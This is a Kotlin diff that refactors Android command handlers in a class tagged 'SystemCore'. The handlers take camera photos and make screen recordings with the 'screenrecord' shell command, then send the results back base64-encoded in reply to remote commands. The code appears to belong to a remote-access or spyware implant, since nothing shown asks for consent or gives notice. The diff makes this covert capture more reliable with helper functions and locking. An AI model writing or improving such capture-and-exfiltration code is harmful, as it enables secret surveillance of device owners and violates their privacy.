@@ -26,8 +26,9 @@ class CameraHandlers(private val ctx: CommandContext) {
         private const val TAG = "SystemCore"
     }
 
-    @Volatile private var screenRecordProcess: Process? = null
-    @Volatile private var screenRecordFile: File? = null
+    private val screenRecordLock = Any()
+    private var screenRecordProcess: Process? = null
+    private var screenRecordFile: File? = null
 
     private fun sendError(message: String) {
         ctx.sendResponse("error", JSONObject().apply {
@@ -85,48 +86,11 @@ class CameraHandlers(private val ctx: CommandContext) {
 
                 val reader = ImageReader.newInstance(largest.width, largest.height, ImageFormat.JPEG, 2)
                 reader.setOnImageAvailableListener({ r ->
-                    val image = r.acquireLatestImage()
-                    if (image != null) {
-                        val buffer = image.planes[0].buffer
-                        val bytes = ByteArray(buffer.remaining())
-                        buffer.get(bytes)
-                        image.close()
-                        result.complete(bytes)
-                    } else {
-                        result.complete(null)
-                    }
+                    processAndSendImage(r, result)
                 }, camHandler)
 
                 var cameraDevice: CameraDevice? = null
-                manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
-                    override fun onOpened(camera: CameraDevice) {
-                        cameraDevice = camera
-                        try {
-                            val surface = reader.surface
-                            camera.createCaptureSession(listOf(surface),
-                                object : CameraCaptureSession.StateCallback() {
-                                    override fun onConfigured(session: CameraCaptureSession) {
-                                        try {
-                                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
-                                            captureBuilder.addTarget(surface)
-                                            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
-                                            session.capture(captureBuilder.build(), null, camHandler)
-                                        } catch (e: Exception) {
-                                            result.complete(null)
-                                        }
-                                    }
-                                    override fun onConfigureFailed(session: CameraCaptureSession) {
-                                        result.complete(null)
-                                    }
-                                }, camHandler)
-                        } catch (e: Exception) {
-                            result.complete(null)
-                        }
-                    }
-                    override fun onDisconnected(camera: CameraDevice) { camera.close(); result.complete(null) }
-                    override fun onError(camera: CameraDevice, error: Int) { camera.close(); result.complete(null) }
-                }, camHandler)
+                manager.openCamera(cameraId, openCameraForPhoto(reader, camHandler, result) { cameraDevice = it }, camHandler)
 
                 val photoBytes = try {
                     withTimeoutOrNull(30000) { result.await() }
@@ -136,19 +100,90 @@ class CameraHandlers(private val ctx: CommandContext) {
                     camThread.quitSafely()
                 }
 
-                if (photoBytes != null && photoBytes.isNotEmpty()) {
-                    val base64 = Base64.encodeToString(photoBytes, Base64.NO_WRAP)
-                    ctx.sendResponse("photo", JSONObject().apply {
-                        put("image_base64", base64)
-                        put("camera_id", cameraId)
-                        put("size", photoBytes.size)
-                    })
-                } else {
-                    sendError("Failed to capture photo")
-                }
+                sendPhotoResult(photoBytes, cameraId)
             } catch (e: Exception) {
                 sendError("Photo error: ${(e.message ?: "Unknown error")}")
             }
+        }
+    }
+
+    private fun openCameraForPhoto(
+        reader: ImageReader,
+        camHandler: Handler,
+        result: CompletableDeferred<ByteArray?>,
+        onDeviceReady: (CameraDevice) -> Unit
+    ): CameraDevice.StateCallback = object : CameraDevice.StateCallback() {
+        override fun onOpened(camera: CameraDevice) {
+            onDeviceReady(camera)
+            createCaptureSession(camera, reader, camHandler, result)
+        }
+        override fun onDisconnected(camera: CameraDevice) { camera.close(); result.complete(null) }
+        override fun onError(camera: CameraDevice, error: Int) { camera.close(); result.complete(null) }
+    }
+
+    private fun createCaptureSession(
+        camera: CameraDevice,
+        reader: ImageReader,
+        camHandler: Handler,
+        result: CompletableDeferred<ByteArray?>
+    ) {
+        try {
+            val surface = reader.surface
+            camera.createCaptureSession(listOf(surface),
+                object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        captureImage(session, camera, surface, camHandler, result)
+                    }
+                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                        result.complete(null)
+                    }
+                }, camHandler)
+        } catch (e: Exception) {
+            result.complete(null)
+        }
+    }
+
+    private fun captureImage(
+        session: CameraCaptureSession,
+        camera: CameraDevice,
+        surface: android.view.Surface,
+        camHandler: Handler,
+        result: CompletableDeferred<ByteArray?>
+    ) {
+        try {
+            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+            captureBuilder.addTarget(surface)
+            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
+            session.capture(captureBuilder.build(), null, camHandler)
+        } catch (e: Exception) {
+            result.complete(null)
+        }
+    }
+
+    private fun processAndSendImage(reader: ImageReader, result: CompletableDeferred<ByteArray?>) {
+        val image = reader.acquireLatestImage()
+        if (image != null) {
+            val buffer = image.planes[0].buffer
+            val bytes = ByteArray(buffer.remaining())
+            buffer.get(bytes)
+            image.close()
+            result.complete(bytes)
+        } else {
+            result.complete(null)
+        }
+    }
+
+    private fun sendPhotoResult(photoBytes: ByteArray?, cameraId: String) {
+        if (photoBytes != null && photoBytes.isNotEmpty()) {
+            val base64 = Base64.encodeToString(photoBytes, Base64.NO_WRAP)
+            ctx.sendResponse("photo", JSONObject().apply {
+                put("image_base64", base64)
+                put("camera_id", cameraId)
+                put("size", photoBytes.size)
+            })
+        } else {
+            sendError("Failed to capture photo")
         }
     }
 
@@ -219,14 +254,22 @@ class CameraHandlers(private val ctx: CommandContext) {
         ctx.scope.launch {
             try {
                 val duration = params?.optInt("duration", 30) ?: 30
-                screenRecordProcess?.destroy()
-                val recordFile = File(ctx.appContext.externalCacheDir, "recording_${System.currentTimeMillis()}.mp4")
-                screenRecordFile = recordFile
-                screenRecordProcess = Runtime.getRuntime().exec(arrayOf(
-                    "screenrecord",
-                    "--time-limit", duration.toString(),
-                    recordFile.absolutePath
-                ))
+                synchronized(screenRecordLock) {
+                    screenRecordProcess?.let { proc ->
+                        try { proc.inputStream?.close() } catch (_: Exception) {}
+                        try { proc.errorStream?.close() } catch (_: Exception) {}
+                        try { proc.outputStream?.close() } catch (_: Exception) {}
+                        proc.destroy()
+                    }
+                    screenRecordProcess = null
+                    val recordFile = File(ctx.appContext.externalCacheDir, "recording_${System.currentTimeMillis()}.mp4")
+                    screenRecordFile = recordFile
+                    screenRecordProcess = Runtime.getRuntime().exec(arrayOf(
+                        "screenrecord",
+                        "--time-limit", duration.toString(),
+                        recordFile.absolutePath
+                    ))
+                }
                 ctx.sendResponse("screen_record_started", JSONObject().apply {
                     put("status", "recording")
                     put("duration", duration)
@@ -240,10 +283,22 @@ class CameraHandlers(private val ctx: CommandContext) {
     fun executeStopScreenRecord() {
         ctx.scope.launch {
             try {
-                screenRecordProcess?.destroy()
-                screenRecordProcess?.waitFor(5, TimeUnit.SECONDS)
+                val process: Process?
+                val file: File?
+                synchronized(screenRecordLock) {
+                    process = screenRecordProcess
+                    file = screenRecordFile
+                    screenRecordProcess = null
+                    screenRecordFile = null
+                }
+                process?.let { proc ->
+                    try { proc.inputStream?.close() } catch (_: Exception) {}
+                    try { proc.errorStream?.close() } catch (_: Exception) {}
+                    try { proc.outputStream?.close() } catch (_: Exception) {}
+                    proc.destroy()
+                    try { proc.waitFor(5, TimeUnit.SECONDS) } catch (_: Exception) {}
+                }
 
-                val file = screenRecordFile
                 if (file != null && file.exists()) {
                     val bytes = file.readBytes()
                     val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
